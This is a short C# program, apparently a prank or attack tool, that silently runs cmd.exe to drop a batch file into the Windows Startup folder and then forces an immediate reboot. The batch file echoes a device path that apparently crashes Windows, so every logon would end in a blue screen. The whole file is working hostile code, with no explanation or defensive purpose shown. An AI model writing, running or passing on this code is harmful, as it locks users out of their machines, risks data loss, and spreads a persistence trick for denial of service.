using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace bsoduserstartup
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C echo \\\\.\\globalroot\\device\\condrv\\kernelconnect  > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bsod.bat\" && shutdown –r –f –t 00";
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
